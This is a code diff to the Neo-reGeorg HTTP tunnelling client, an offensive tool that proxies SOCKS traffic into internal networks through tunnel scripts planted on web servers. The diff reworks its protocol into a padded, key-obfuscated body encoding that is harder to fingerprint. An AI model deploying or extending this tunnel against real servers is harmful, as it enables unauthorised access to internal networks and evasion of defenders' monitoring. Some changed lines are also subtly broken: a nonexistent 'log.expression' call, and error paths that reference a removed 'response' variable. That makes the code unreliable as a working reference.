@@ -16,6 +16,7 @@ import argparse
 import requests
 import uuid
 import codecs
+from collections import defaultdict
 from time import sleep, time, mktime
 from datetime import datetime
 from socket import *
@@ -79,6 +80,100 @@ COLORS = {
     'WHITE':    WHITE,
 }
 
+BLVHEAD = [
+    None,
+    'CMD',
+    'MARK',
+    'STATUS',
+    'ERROR',
+    'IP',
+    'PORT',
+    'REDIRECTURL',
+    'DATA',
+]
+
+
+def blv_encode(info):
+    head_len = random.randint(5, 20)
+    tail_len = random.randint(5, 20)
+    head_rand = os.urandom(head_len)
+    tail_rand = os.urandom(tail_len)
+
+    data = struct.pack('>bi{len}s'.format(len=head_len), 0, head_len, head_rand)  # 头部填充
+
+    for k, v in info.items():
+        if v:
+            b = BLVHEAD.index(k)
+            if ispython3 and type(v) == str:
+                v = v.encode()
+            l = len(v)
+            data += struct.pack('>bi{len}s'.format(len=l), b, l, v)
+
+
+    data += struct.pack('>bi{len}s'.format(len=tail_len), 9, tail_len, tail_rand)  # 尾部填充
+    return data
+
+
+def blv_decode(data):
+    data_len = len(data)
+    if data_len == 0:
+        return None
+
+    info = defaultdict(bytes)
+    i = 0
+
+    while i < data_len:
+        try:
+            b, l = struct.unpack('>bi', data[i:i+5])
+        except struct.error:
+            return None
+        i += 5
+        v = data[i:i+l]
+        i += l
+        if i > data_len:
+            return None
+
+        if b >= 1 and b <= 8:
+            name = BLVHEAD[b]
+            if name != 'DATA':
+                v = v.decode()
+            info[name] = v
+
+    return info
+
+
+def encode_body(info):
+    data = blv_encode(info)
+    data = base64.b64encode(data)
+    if ispython3:
+        data = data.decode()
+    return data.translate(EncodeMap)
+
+
+def decode_body(data):
+    if ispython3:
+        data = data.decode()
+    data = base64.b64decode(data.translate(DecodeMap))
+    return blv_decode(data)
+
+
+def file_read(filename):
+    try:
+        with codecs.open(filename, encoding="utf-8") as f:
+            return f.read()
+    except:
+        log.error("Failed to read file: %s" % filename)
+        exit()
+
+
+def file_write(filename, data):
+    try:
+        with open(filename, 'w') as f:
+            f.write(data)
+    except:
+        log.error("Failed to write file: %s" % filename)
+        exit()
+
 
 def formatter_message(message, use_color=True):
     if use_color:
@@ -124,20 +219,15 @@ transferLog = logging.getLogger("transfer")
 class SocksCmdNotImplemented(Exception):
     pass
 
+
 class Rand:
     def __init__(self, key):
         n = int(hashlib.sha512(key.encode()).hexdigest(), 16)
-        self.k_clist = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
         self.v_clist = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_"
-        self.k_clen = len(self.k_clist)
         self.v_clen = len(self.v_clist)
         random.seed(n)
 
-    def header_key(self):
-        str_len = random.getrandbits(4) + 2 # len 2 to 17
-        return ''.join([ self.k_clist[random.getrandbits(10) % self.k_clen] for _ in range(str_len) ]).capitalize()
-
-    def header_value(self):
+    def rand_value(self):
         str_len = random.getrandbits(6) + 2 # len 2 to 65
         return ''.join([ self.v_clist[random.getrandbits(10) % self.v_clen] for _ in range(str_len) ])
 
@@ -170,22 +260,18 @@ class session(Thread):
         Thread.__init__(self)
         self.pSocket = pSocket
         self.connectURLs = connectURLs
-        self.redirectURLs = redirectURLs
         self.conn = conn
         self.connect_closed = False
         self.session_connected = False
         self.fwd_target = FwdTarget
+        self.redirectURL = None
+        if redirectURLs:
+            self.redirectURL = random.choice(redirectURLs)
+
 
     def url_sample(self):
         return random.choice(self.connectURLs)
 
-    def redirect_url_sample(self):
-        return random.choice(self.redirectURLs)
-
-    def headerupdate(self, headers):
-        headers.update(HEADERS)
-        if self.redirectURLs:
-            headers[K['X-REDIRECTURL']] = self.redirect_url_sample()
 
     def session_mark(self):
         mark = base64.b64encode(uuid.uuid4().bytes)[0:-2]
@@ -194,6 +280,7 @@ class session(Thread):
         mark = mark.replace('+', ' ').replace('/', '_')
         mark = re.sub('^[ _]| $', 'L', mark) # Invalid return character or leading space in header
         return mark
+
 
     def parseSocks5(self, sock):
         log.debug("SocksVersion5 detected")
@@ -253,6 +340,7 @@ class session(Thread):
 
         raise SocksCmdNotImplemented("Socks5 - Unknown CMD")
 
+
     def handleSocks(self, sock):
         try:
             ver = sock.recv(1)
@@ -271,6 +359,7 @@ class session(Thread):
         except timeout:
             return False
 
+
     def handleFwd(self, sock):
         log.debug("Forward detected")
         host, port = self.fwd_target.split(':', 1)
@@ -278,62 +367,44 @@ class session(Thread):
         return bool(mark)
 
 
-    def error_log(self, str_format, headers):
-        if K['X-ERROR'] in headers:
-            message = headers[K["X-ERROR"]]
-            if message in rV:
-                message = rV[message]
-            log.error(str_format.format(repr(message)))
+    def neoreg_request(self, info, timeout=None):
+        if self.redirectURL:
+            info['REDIRECTURL'] = self.redirectURL
+        data = encode_body(info)
+        log.debug("[HTTP] {} Request ({}) => Target: {}:{}".format(info['CMD'], self.mark, self.target, self.port))
+        response = self.conn.post(self.url_sample(), headers=HEADERS, timeout=timeout, data=data)
+        log.debug("[HTTP] {} Response ({}) => Code: {}".format(info['CMD'], self.mark, response.status_code))
+        return decode_body(response.content)
 
-    def encode_target(self, data):
-        data = base64.b64encode(data)
-        if ispython3:
-            data = data.decode()
-        return data.translate(EncodeMap)
-
-    def encode_body(self, data):
-        data = base64.b64encode(data)
-        if ispython3:
-            data = data.decode()
-        return data.translate(EncodeMap)
-
-    def decode_body(self, data):
-        if ispython3:
-            data = data.decode()
-        return base64.b64decode(data.translate(DecodeMap))
 
     def setupRemoteSession(self, target, port):
         self.mark = self.session_mark()
-        target_data = ("%s|%d" % (target, port)).encode()
-        headers = {K["X-CMD"]: self.mark+V["CONNECT"], K["X-TARGET"]: self.encode_target(target_data)}
-        self.headerupdate(headers)
-        self.target = target
+        self.target = target.encode()
         self.port = port
+
+        info = {'CMD': 'CONNECT', 'MARK': self.mark, 'IP': self.target, 'PORT': str(self.port)}
 
         if '.php' in self.connectURLs[0]:
             try:
-                log.debug("[HTTP] CONNECT Request ({}) => Target: {}".format(self.mark, target_data))
-                response = self.conn.get(self.url_sample(), headers=headers, timeout=PHPTIMEOUT)
-                log.debug("[HTTP] CONNECT Response ({}) => Code: {}".format(self.mark, response.status_code))
+                rinfo = self.neoreg_request(info, timeout=PHPTIMEOUT)
             except:
                 log.info("[%s:%d] HTTP [200]: mark [%s]" % (self.target, self.port, self.mark))
                 return self.mark
         else:
-            response = self.conn.get(self.url_sample(), headers=headers)
+            rinfo = self.neoreg_request(info)
 
-
-        rep_headers = response.headers
-        if K['X-STATUS'] in rep_headers:
-            status = rep_headers[K["X-STATUS"]]
-            if status == V["OK"]:
+        if rinfo:
+            status = rinfo["STATUS"]
+            if status == "OK":
                 log.info("[%s:%d] Session mark [%s]" % (self.target, self.port, self.mark))
                 return self.mark
             else:
-                self.error_log('[CONNECT] [%s:%d] ERROR: {}' % (self.target, self.port), rep_headers)
+                log.error('[CONNECT] [%s:%d] ERROR: %s' % (self.target, self.port, rinfo['ERROR']))
                 return False
         else:
             log.critical('Bad KEY or non-neoreg server or Request Timeout')
             return False
+
 
     def closeRemoteSession(self):
         try:
@@ -347,11 +418,8 @@ class session(Thread):
                         log.debug("[%s:%d] Localsocket already closed" % (self.target, self.port))
 
                 if hasattr(self, 'mark'):
-                    headers = {K["X-CMD"]: self.mark+V["DISCONNECT"]}
-                    self.headerupdate(headers)
-                    log.debug("[HTTP] DISCONNECT Request ({})".format(self.mark))
-                    response = self.conn.get(self.url_sample(), headers=headers)
-                    log.debug("[HTTP] DISCONNECT Response ({}) => Code: {}".format(self.mark, response.status_code))
+                    info = {'CMD': 'DISCONNECT', 'MARK': self.mark}
+                    rinfo = self.neoreg_request(info)
                 if not self.connect_closed:
                     if hasattr(self, 'target'):
                         log.info("[DISCONNECT] [%s:%d] Connection Terminated" % (self.target, self.port))
@@ -360,32 +428,24 @@ class session(Thread):
         except requests.exceptions.ConnectionError as e:
             log.warning('[requests.exceptions.ConnectionError] {}'.format(e))
 
+
     def reader(self):
         try:
-            headers = {K["X-CMD"]: self.mark+V["READ"]}
-            self.headerupdate(headers)
+            info = {'CMD': 'READ', 'MARK': self.mark}
             n = 0
             while True:
                 try:
                     if self.connect_closed or self.pSocket.fileno() == -1:
                         break
-                    log.debug("[HTTP] READ Request ({})".format(self.mark))
-                    response = self.conn.get(self.url_sample(), headers=headers)
-                    log.debug("[HTTP] READ Response ({}) => Code: {}, Size: {}".format(self.mark, response.status_code, len(response.content)))
-                    rep_headers = response.headers
-                    if K['X-STATUS'] in rep_headers:
-                        status = rep_headers[K["X-STATUS"]]
-                        if status == V["OK"]:
-                            data = response.content
-                            data = extract_body(data)
+                    rinfo = self.neoreg_request(info)
+                    if rinfo:
+                        if rinfo['STATUS'] == 'OK':
+                            data = rinfo['DATA']
                             if len(data) == 0:
                                 sleep(READINTERVAL)
                                 continue
-                            else:
-                                data = self.decode_body(data)
                         else:
-                            msg = "[READ] [%s:%d] HTTP [%d]: Status: [%s]: Message [{}] Shutting down" % (self.target, self.port, response.status_code, rV[status])
-                            self.error_log(msg, rep_headers)
+                            log.error("[READ] [%s:%d] STATUS [%s] Message [%s] Shutting down" % (self.target, self.port, rinfo['STATUS'], rinfo['ERROR']))
                             break
                     else:
                         log.error("[READ] [%s:%d] HTTP [%d]: Shutting down" % (self.target, self.port, response.status_code))
@@ -408,30 +468,26 @@ class session(Thread):
                 except requests.exceptions.ChunkedEncodingError as e: # python2 requests error
                     log.warning('[requests.exceptions.ChunkedEncodingError] {}'.format(e))
                 except Exception as ex:
-                    raise ex
+                    log.expression(ex)
+                    break
         finally:
             self.closeRemoteSession()
 
+
     def writer(self):
         try:
-            headers = {K["X-CMD"]: self.mark+V["FORWARD"], 'Content-type': 'application/octet-stream'}
-            self.headerupdate(headers)
+            info = {'CMD': 'FORWARD', 'MARK': self.mark}
             n = 0
             while True:
                 try:
                     raw_data = self.pSocket.recv(READBUFSIZE)
                     if not raw_data:
                         break
-                    data = self.encode_body(raw_data)
-                    log.debug("[HTTP] FORWARD Request ({}) => Size: {}".format(self.mark, len(data)))
-                    response = self.conn.post(self.url_sample(), headers=headers, data=data)
-                    log.debug("[HTTP] FORWARD Response ({}) => Code: {}".format(self.mark, response.status_code))
-                    rep_headers = response.headers
-                    if K['X-STATUS'] in rep_headers:
-                        status = rep_headers[K["X-STATUS"]]
-                        if status != V["OK"]:
-                            msg = "[FORWARD] [%s:%d] HTTP [%d]: Status: [%s]: Message [{}] Shutting down" % (self.target, self.port, response.status_code, rV[status])
-                            self.error_log(msg, rep_headers)
+                    info['DATA'] = raw_data
+                    rinfo = self.neoreg_request(info)
+                    if rinfo:
+                        if rinfo['STATUS'] != "OK":
+                            log.error("[FORWARD] [%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down" % (self.target, self.port, response.status_code, rinfo['STATUS'], rinfo['ERROR']))
                             break
                     else:
                         log.error("[FORWARD] [%s:%d] HTTP [%d]: Shutting down" % (self.target, self.port, response.status_code))
@@ -450,10 +506,11 @@ class session(Thread):
                     log.error('[requests.exceptions.ConnectionError] {}'.format(e))
                     break
                 except Exception as ex:
-                    raise ex
+                    log.exception(ex)
                     break
         finally:
             self.closeRemoteSession()
+
 
     def run(self):
         try:
@@ -476,7 +533,8 @@ class session(Thread):
         except requests.exceptions.ConnectionError as e:
             log.warning('[requests.exceptions.ConnectionError] {}'.format(e))
         except Exception as e:
-            log.error('[RUN] {}'.format(e))
+            log.error('[RUN]:')
+            log.exception(e)
             raise e
         finally:
             if self.session_connected:
@@ -489,16 +547,18 @@ def askGeorg(conn, connectURLs, redirectURLs):
     headers = {}
     headers.update(HEADERS)
 
-    if redirectURLs:
-        headers[K['X-REDIRECTURL']] = redirectURLs[0]
-
     if INIT_COOKIE:
         headers['Cookie'] = INIT_COOKIE
 
     need_exit = False
     try:
         log.debug("[HTTP] Ask Georg Request".format())
-        response = conn.get(connectURLs[0], headers=headers, timeout=10)
+        if redirectURLs:
+            info = {'REDIRECTURL': redirectURLs[0]}
+            data = encode_body(info)
+            response = conn.post(connectURLs[0], headers=headers, timeout=10, data=data)
+        else:
+            response = conn.get(connectURLs[0], headers=headers, timeout=10)
         log.debug("[HTTP] Ask Georg Response =>  Code: {}".format(response.status_code))
         if '.php' in connectURLs[0]:
             if 'Expires' in response.headers:
@@ -519,7 +579,8 @@ def askGeorg(conn, connectURLs, redirectURLs):
                 except ValueError:
                     log.warning('Expires wrong format: {}'.format(expires))
     except Exception as ex:
-        log.error("Georg is not ready, please check URL. Error: " + str(ex))
+        log.error("Georg is not ready, please check URL")
+        log.exception(ex)
         exit()
 
     if need_exit:
@@ -550,16 +611,10 @@ def askGeorg(conn, connectURLs, redirectURLs):
             log.debug("Ignore detecting that Georg is ready")
 
         else:
-            if K['X-ERROR'] in response.headers:
-                message = response.headers[K["X-ERROR"]]
-                if message in rV:
-                    message = rV[message]
-                log.error("Georg is not ready. Error message: %s" % message)
-            else:
-                log.warning('Expect Response: {}'.format(BASICCHECKSTRING[0:100]))
-                log.warning('Real Response: {}'.format(data.strip()[0:100]))
-                log.error("Georg is not ready, please check URL and KEY. rep: [{}] {}".format(response.status_code, response.reason))
-                log.error("You can set the `--skip` parameter to ignore errors")
+            log.warning('Expect Response: {}'.format(BASICCHECKSTRING[0:100]))
+            log.warning('Real Response: {}'.format(data.strip()[0:100]))
+            log.error("Georg is not ready, please check URL and KEY. rep: [{}] {}".format(response.status_code, response.reason))
+            log.error("You can set the `--skip` parameter to ignore errors")
             exit()
 
 
@@ -591,22 +646,6 @@ def choice_useragent():
     return random.choice(user_agents)
 
 
-def file_read(filename):
-    try:
-        with codecs.open(filename, encoding="utf-8") as f:
-            return f.read()
-    except:
-        log.error("Failed to read file: %s" % filename)
-        exit()
-
-
-def file_write(filename, data):
-    try:
-        with open(filename, 'w') as f:
-            f.write(data)
-    except:
-        log.error("Failed to write file: %s" % filename)
-        exit()
 
 banner = r"""
 
@@ -664,7 +703,7 @@ if __name__ == '__main__':
         parser.add_argument("--max-read-size", metavar="KB", help="Remote max read size. (default: 512)", type=int, default=512)
         args = parser.parse_args()
     else:
-        parser = argparse.ArgumentParser(description="Socks server for Neoreg HTTP(s) tunneller. DEBUG MODE: -k (debug_all|debug_base64|debug_headers_key|debug_headers_values)")
+        parser = argparse.ArgumentParser(description="Socks server for Neoreg HTTP(s) tunneller. DEBUG MODE: -k debug")
         parser.add_argument("-u", "--url", metavar="URI", required=True, help="The url containing the tunnel script", action='append')
         parser.add_argument("-r", "--redirect-url", metavar="URL", help="Intranet forwarding the designated server (only jsp(x))", action='append')
         parser.add_argument("-t", "--target", metavar="IP:PORT", help="Network forwarding Target, After setting this parameter, port forwarding will be enabled")
@@ -698,7 +737,7 @@ if __name__ == '__main__':
     rand = Rand(args.key)
 
     BASE64CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    if args.key in ['debug_all', 'debug_base64']:
+    if args.key == 'debug':
         M_BASE64CHARS = BASE64CHARS
     else:
         M_BASE64CHARS = list(BASE64CHARS)
@@ -713,27 +752,7 @@ if __name__ == '__main__':
     EncodeMap = maketrans(BASE64CHARS, M_BASE64CHARS)
     DecodeMap = maketrans(M_BASE64CHARS, BASE64CHARS)
 
-    BASICCHECKSTRING = ('<!-- ' + rand.header_value() + ' -->').encode()
-
-    K = {}
-    for name in ["X-STATUS", "X-ERROR", "X-CMD", "X-TARGET", "X-REDIRECTURL"]:
-        if args.key in ['debug_all', 'debug_headers_key']:
-            K[name] = name
-        else:
-            K[name] = rand.header_key()
-
-    V = {}
-    rV = {}
-    for name in ["FAIL", "Failed creating socket", "Failed connecting to target", "OK", "Failed writing socket",
-            "CONNECT", "DISCONNECT", "READ", "FORWARD", "Failed reading from socket", "No more running, close now",
-            "POST request read filed", "Intranet forwarding failed"]:
-        if args.key in ['debug_all', 'debug_headers_value']:
-            V[name] = name
-            rV[name] = name
-        else:
-            value = rand.header_value()
-            V[name] = value
-            rV[value] = name
+    BASICCHECKSTRING = ('<!-- ' + rand.rand_value() + ' -->').encode()
 
     if 'url' in args:
         # neoreg connect
@@ -754,16 +773,9 @@ if __name__ == '__main__':
         PHPTIMEOUT = args.php_connect_timeout
 
         urls = args.url
-        redirect_urls = []
+        redirect_urls = args.redirect_url
 
-        HEADERS = {}
-        if args.redirect_url:
-            for url in args.redirect_url:
-                data = base64.b64encode(url.encode())
-                if ispython3:
-                    data = data.decode()
-                redirect_urls.append( data.translate(EncodeMap) )
-
+        HEADERS = { 'Content-type': 'application/octet-stream' }
         for header in args.header:
             if ':' in header:
                 key, value = header.split(':', 1)
@@ -832,7 +844,7 @@ if __name__ == '__main__':
                 except KeyboardInterrupt as ex:
                     break
                 except timeout:
-                    log.warning("[Socks Connect Tiemout] {}".format(addr_info))
+                    log.warning("[Socks Connect Timeout] {}".format(addr_info))
                     if sock:
                         sock.close()
                 except OSError:
@@ -895,19 +907,9 @@ if __name__ == '__main__':
 
                 text = re.sub(r"\bREADBUF\b", str(READBUF), text)
                 text = re.sub(r"\bMAXREADSIZE\b", str(MAXREADSIZE), text)
-
-                for k, v in chain(K.items(), V.items()):
-                    text = re.sub(r'\b%s\b' % k, v, text)
-
                 text = re.sub(r"\bHTTPCODE\b", str(args.httpcode), text)
 
                 file_write(outfile, text)
                 print("       => %s/%s" % (outdir, os.path.basename(outfile)))
 
-                # jsp/jspx trimDirectiveWhitespaces=true
-                if filename.endswith(('.jsp', '.jspx')):
-                    text = text.replace(' trimDirectiveWhitespaces="true"', '')
-                    outfile = os.path.join(outdir, filename.replace('tunnel.', 'tunnel_compatibility.'))
-                    file_write(outfile, text)
-                    print("       => %s/%s" % (outdir, os.path.basename(outfile)))
         print('')
